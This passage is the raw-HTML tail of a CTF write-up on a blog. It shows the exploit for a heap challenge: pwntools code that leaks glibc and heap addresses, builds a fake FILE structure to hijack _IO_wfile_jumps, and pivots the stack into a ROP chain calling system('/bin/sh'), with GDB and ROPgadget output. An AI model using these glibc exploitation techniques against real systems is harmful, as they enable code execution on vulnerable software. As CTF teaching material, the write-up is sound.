<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk1">HEADER</span><span class="mtk1">, </span><span class="mtk1">CITY</span><span class="mtk1">, p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">406040</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">20</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk8">throw</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">index</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Name: '</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">:][:</span><span class="mtk6">6</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">21b0d0</span>
<span class="mtk1">    </span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">data</span><span class="mtk1">[</span><span class="mtk1">data</span><span class="mtk1">.</span><span class="mtk8">index</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Date: '</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">6</span><span class="mtk1">:][:</span><span class="mtk6">4</span><span class="mtk1">].</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">290</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Heap base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">heap_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk1">LARGE</span><span class="mtk1">, </span><span class="mtk1">WITHOUT_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">stderr_lock</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">21ca70</span><span class="mtk1">  </span><span class="mtk3"># _IO_stdfile_1_lock (symbol not exported)</span>
<span class="mtk1">    </span><span class="mtk1">fake_vtable</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_wfile_jumps</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">40</span><span class="mtk1">  </span><span class="mtk3"># _IO_wfile_underflow</span>

<span class="mtk1">    </span><span class="mtk1">fake</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">FileStructure</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">fake</span><span class="mtk1">.</span><span class="mtk1">flags</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">3b01010101010101</span>
<span class="mtk1">    </span><span class="mtk1">fake</span><span class="mtk1">.</span><span class="mtk1">_IO_buf_base</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">123</span>
<span class="mtk1">    </span><span class="mtk1">fake</span><span class="mtk1">.</span><span class="mtk1">_lock</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">stderr_lock</span>
<span class="mtk1">    </span><span class="mtk1">fake</span><span class="mtk1">.</span><span class="mtk1">unknown2</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.</span><span class="mtk6">_IO_file_jumps</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">3</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">fake_vtable</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk1">fake</span><span class="mtk1">.</span><span class="mtk1">_wide_data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">456</span>

<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk1">FOOTER</span><span class="mtk1">, </span><span class="mtk1">DATE</span><span class="mtk1">, p64(</span><span class="mtk1">fake</span><span class="mtk1">.</span><span class="mtk1">flags</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk1">HEADER</span><span class="mtk1">, </span><span class="mtk1">CITY</span><span class="mtk1">, p64(</span><span class="mtk1">fake</span><span class="mtk1">.</span><span class="mtk1">_IO_read_end</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk1">TEXT</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk7">bytes</span><span class="mtk1">(</span><span class="mtk1">fake</span><span class="mtk1">)[</span><span class="mtk7 mtki">0x</span><span class="mtk6">30</span><span class="mtk1">:])</span>

<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt;'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'4'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">()</span>

<span class="mtk1">    </span><span class="mtk1">io</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>
</code></pre></div><p>If we follow the execution of <code>fflush</code>, we will reach a point where the function calls a pointer of the <em>vtable</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/i $rip
=&gt; <span class="code-dark-blue">0x7fbe1097d1a7</span> &lt;<span class="code-dark-yellow">__GI__IO_fflush</span>+119&gt;:        <span class="code-dark-green">call</span><span class="code-white">   <span class="code-dark-red">QWORD</span><span class="code-white"> <span class="code-dark-red">PTR</span><span class="code-white"> </span>[<span class="code-dark-red">rbp</span><span class="code-red mtku">+</span><span class="code-dark-blue">0x60</span>]</span></span>
<span class="code-green">gef&gt; </span>x/gx $rbp
<span class="code-dark-blue">0x7fbe10b15080</span> &lt;<span class="code-dark-yellow">_IO_wfile_jumps_mmap</span>+128&gt;:      0x00007fbe10988670
<span class="code-green">gef&gt; </span>x/gx $rbp+0x60
<span class="code-dark-blue">0x7fbe10b150e0</span> &lt;<span class="code-dark-yellow">_IO_wfile_jumps</span>+32&gt;:    0x00007fbe10982fd0
<span class="code-green">gef&gt; </span>telescope -n &_IO_wfile_jumps 10
<span class="code-dark-cyan">0x7fbe10b150c0</span>|+0x0000|+000: 0x0000000000000000
<span class="code-dark-cyan">0x7fbe10b150c8</span>|+0x0008|+001: 0x0000000000000000
<span class="code-dark-cyan">0x7fbe10b150d0</span>|+0x0010|+002: <span class="code-dark-red">0x00007fbe10989ff0</span> &lt;_IO_file_finish&gt;  -&gt;  0xfd894855fa1e0ff3
<span class="code-dark-cyan">0x7fbe10b150d8</span>|+0x0018|+003: <span class="code-dark-red">0x00007fbe10984390</span> &lt;_IO_wfile_overflow&gt;  -&gt;  0x48555441fa1e0ff3
<span class="code-dark-cyan">0x7fbe10b150e0</span>|+0x0020|+004: <span class="code-dark-red">0x00007fbe10982fd0</span> &lt;_IO_wfile_underflow&gt;  -&gt;  0x56415741fa1e0ff3
<span class="code-dark-cyan">0x7fbe10b150e8</span>|+0x0028|+005: <span class="code-dark-red">0x00007fbe10981840</span> &lt;_IO_wdefault_uflow&gt;  -&gt;  0x158d4855fa1e0ff3
<span class="code-dark-cyan">0x7fbe10b150f0</span>|+0x0030|+006: <span class="code-dark-red">0x00007fbe10981600</span> &lt;_IO_wdefault_pbackfail&gt;  -&gt;  0x89495741fa1e0ff3  
<span class="code-dark-cyan">0x7fbe10b150f8</span>|+0x0038|+007: <span class="code-dark-red">0x00007fbe10984840</span> &lt;_IO_wfile_xsputn&gt;  -&gt;  0x0fd28548fa1e0ff3
<span class="code-dark-cyan">0x7fbe10b15100</span>|+0x0040|+008: <span class="code-dark-red">0x00007fbe109892b0</span> &lt;__GI__IO_file_xsgetn&gt;  -&gt;  0x56415741fa1e0ff3
<span class="code-dark-cyan">0x7fbe10b15108</span>|+0x0048|+009: <span class="code-dark-red">0x00007fbe10983750</span> &lt;_IO_wfile_seekoff&gt;  -&gt;  0x89495741fa1e0ff3
</code></pre></div><p>As <a target="_blank" href="https://github.com/nobodyisnobody/docs/tree/main/code.execution.on.last.libc#3---the-fsop-way-targetting-stdout">nobodyisnobody</a> mentioned, we want to call <code>_IO_wfile_underflow</code>. Although the House of Apple 2 uses <code>_IO_wfile_overflow</code>, we can try to mix both paths. The relevant code appears in <a target="_blank" href="https://blog.kylebot.net/2022/10/22/angry-FSROP/#angry-FSROP-Case-Study">blog.kylebot.net</a>.</p><p>If we continue with the execution of <code>_IO_wfile_underflow</code> we will go to <code>_IO_wdoallocbuf</code>, that will execute these instructions:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">mov rax, QWORD PTR [rax + 0xe0]  
call   QWORD PTR [rax + 0x68]
</code></pre></div><p>In <code>$rax</code> we have the pointer to <code>_wide_data</code>, that we control. So, in <code>$rax</code> we have to put an address so that, in that address plus <code>0xe0</code> we can reference to a function that is at an offset of <code>0x68</code>. It looks complicated, but it is not.</p><p>We can modify the following parameters of the exploit:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk1">LARGE</span><span class="mtk1">, </span><span class="mtk1">WITHOUT_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'<span class="mtk6">\0</span>'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">e0</span> <span class="mtk5">+</span> p64(heap_addr <span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">789</span>)<span class="mtk1">)</span>  

    <span class="mtk3"># ...</span>

<span class="mtk1">    </span><span class="mtk1">fake</span><span class="mtk1">.</span><span class="mtk1">_wide_data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">f90</span>
</code></pre></div><p>And when we get to the critical point, we have the following:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/i $rip
=&gt; <span class="code-dark-blue">0x7f652b0a6b94</span> &lt;<span class="code-dark-yellow">__GI__IO_wdoallocbuf</span>+36&gt;:    <span class="code-dark-green">mov</span><span class="code-white">    <span class="code-dark-red">rax</span>,<span class="code-dark-red">QWORD</span><span class="code-white"> <span class="code-dark-red">PTR</span><span class="code-white"> </span>[<span class="code-dark-red">rax</span><span class="code-red mtku">+</span><span class="code-dark-blue">0xe0</span>]</span></span></span>  
<span class="code-green">gef&gt; </span>p/x $rax
$3 = 0x11ccf90
<span class="code-green">gef&gt; </span>p/x $rax + 0xe0
$4 = 0x11cd070
<span class="code-green">gef&gt; </span>x/gx $rax + 0xe0
<span class="code-dark-blue">0x11cd070</span>:      0x00000000011cc789
</code></pre></div><p>With this, we are pointing the execution to the last chunk that we have allocated. Instead of putting the address that ends at <code>789</code>, we can set that address plus <code>0x68</code> equal to the next (<code>0x11cd078</code>), in order to control the <code>call</code> instruction:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk1">LARGE</span><span class="mtk1">, </span><span class="mtk1">WITHOUT_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'<span class="mtk6">\0</span>'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">e0</span> <span class="mtk5">+</span> p64(heap_addr <span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1010</span>) <span class="mtk5">+</span> p64(heap_addr <span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">abc</span>)<span class="mtk1">)</span>  
</code></pre></div><p>Now, when we reach the point of before, we have advanced something else and we already control the <code>call</code> instruction:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/i $rip
=&gt; <span class="code-dark-blue">0x7fa6473d0b94</span> &lt;<span class="code-dark-yellow">__GI__IO_wdoallocbuf</span>+36&gt;:    <span class="code-dark-green">mov</span><span class="code-white">    <span class="code-dark-red">rax</span>,<span class="code-dark-red">QWORD</span><span class="code-white"> <span class="code-dark-red">PTR</span><span class="code-white"> </span>[<span class="code-dark-red">rax</span><span class="code-red mtku">+</span><span class="code-dark-blue">0xe0</span>]</span></span></span>  
<span class="code-green">gef&gt; </span>p/x $rax
$3 = 0x229ef90
<span class="code-green">gef&gt; </span>p/x $rax + 0xe0
$4 = 0x229f070
<span class="code-green">gef&gt; </span>x/gx $rax + 0xe0
<span class="code-dark-blue">0x229f070</span>:      0x000000000229f010
<span class="code-green">gef&gt; </span>p/x 0x000000000229f010 + 0x68
$5 = 0x229f078
<span class="code-green">gef&gt; </span>x/gx 0x000000000229f010 + 0x68
<span class="code-dark-blue">0x229f078</span>:      0x000000000229eabc
</code></pre></div><p>If we continue an instruction, GDB will tell us the call to the function that is about to perform:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-dark-cyan">------------------------------------------------------------------------------------------------------------------------------------- arguments (guessed) ----</span>  
0x229eabc &lt;NO_SYMBOL&gt; (
   <span class="code-dark-blue">$rdi</span> = <span class="code-dark-blue">0x000000000229e6e0</span>  -&gt;  0x3b01010101010101,
   <span class="code-dark-blue">$rsi</span> = 0x0000000000000001,
   <span class="code-dark-blue">$rdx</span> = 0x0000000000000421,
   <span class="code-dark-blue">$rcx</span> = 0x0000000000000000,
   <span class="code-dark-blue">$r8</span> = 0x000000000000000a,
   <span class="code-dark-blue">$r9</span> = 0x0000000000000000
)
</code></pre></div><p>Great, with this we have <code>$rip</code> control, and some control over the registers:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>info registers
rax            0x229f010           0x229f010
rbx            0x229e6e0           0x229e6e0
rcx            0x0                 0x0
rdx            0x421               0x421
rsi            0x1                 0x1
rdi            0x229e6e0           0x229e6e0
rbp            0x7fa647564080      0x7fa647564080 &lt;_IO_wfile_jumps_mmap+128&gt;  
rsp            0x7fffd6302c20      0x7fffd6302c20
r8             0xa                 0xa
r9             0x0                 0x0
r10            0x7fa64750bac0      0x7fa64750bac0
r11            0x246               0x246
r12            0x7fffd6302e28      0x7fffd6302e28
r13            0x401276            0x401276
r14            0x0                 0x0
r15            0x7fa6475c0040      0x7fa6475c0040
rip            0x7fa6473d0b9b      0x7fa6473d0b9b &lt;__GI__IO_wdoallocbuf+43&gt;
eflags         0x246               [ PF ZF IF ]
cs             0x33                0x33
ss             0x2b                0x2b
ds             0x0                 0x0
es             0x0                 0x0
fs             0x0                 0x0
gs             0x0                 0x0
</code></pre></div><h3 id="getting-rce">Getting RCE</h3><p>At this point, we can try to use <a target="_blank" href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a>, but none of the options works. So, the simplest is trying to use a ROP chain. This, in the heap it is not so simple. But since we have <code>$rip</code> control and a lot of gadgets available in Glibd, we can use a Stack Pivot:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">/lib/x86_64-linux-gnu/libc.so.6</span> &gt; rop.txt  

<span class="code-cyan">$</span> <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': xchg .sp, .ax ; ret$'</span> <span class="mtku">rop.txt</span>
0x000000000003653a <span class="code-red">: xchg esp, eax ; ret</span>

<span class="code-cyan">$</span> <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': xchg .ax, .sp ; ret$'</span> <span class="mtku">rop.txt</span>
0x00000000001b5503 <span class="code-red">: xchg eax, esp ; ret
</code></pre></div><p>Any of these two gadgets helps us to change the stack pointer <code>$rsp</code> to the value of <code>$rax</code> (a heap address). And we will put a typical Ret2Libc ROP chain (<code>pop rdi; ret</code>, address of <code>"/bin/sh"</code> and a call to <code>system</code>) in the address pointed to by <code>$rax</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">xchg_eax_esp_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1b5503</span>
<span class="mtk1">    </span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2a3e5</span>

<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rdi_ret_addr</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk7">next</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk8">search</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)))</span>
<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system)</span>

<span class="mtk1">    </span><span class="mtk8">create</span><span class="mtk1">(</span><span class="mtk6">3</span><span class="mtk1">, </span><span class="mtk1">LARGE</span><span class="mtk1">, </span><span class="mtk1">WITHOUT_FOOTER</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'D'</span><span class="mtk1">, p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">rop_chain</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">9</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1010</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">xchg_eax_esp_ret_addr</span><span class="mtk1">))</span>  
</code></pre></div><p>And with this, we get a local shell (it works 3/4 times):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './chall'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 468990
[<span class="code-green">+</span>] Glibc base address: 0x7f45d92be000
[<span class="code-green">+</span>] Heap base address: 0x1844000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
Dockerfile  ctf.xinetd         docker-compose.yml  flag.txt    rop.txt
chall        deploy-challenge.sh  entrypoint.sh         libc.so.6    solve.py  
</code></pre></div><h2 id="flag">Flag</h2><p>If we deploy the Docker container to test the exploit remotely, we will see that it also works:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1 42069
[<span class="code-blue">*</span>] './chall'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x400000)</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 42069: Done  
[<span class="code-green">+</span>] Glibc base address: 0x7fd2c5d49000
[<span class="code-green">+</span>] Heap base address: 0x1f5c000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> hostname
cfdc5a495d67
<span class="code-red">$</span> cat /flag.txt
HackOn{f4k3_fl4g_4_t3st1ng}
</code></pre></div><p>The full exploit can be found in here: <a target="_blank" href="https://github.com/7Rocky/CTF-scripts/tree/main/HackOn%20CTF/La%20casa%20de%20papel/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#source-code-analysis">Source code analysis</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#edit-function">Edit function</a></li><li><a href="#read-function">Read function</a></li><li><a href="#free-function">Free function</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a><ul><li><a href="#large-bin-attack">Large Bin attack</a></li></ul></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#fsop">FSOP</a></li><li><a href="#getting-rce">Getting RCE</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 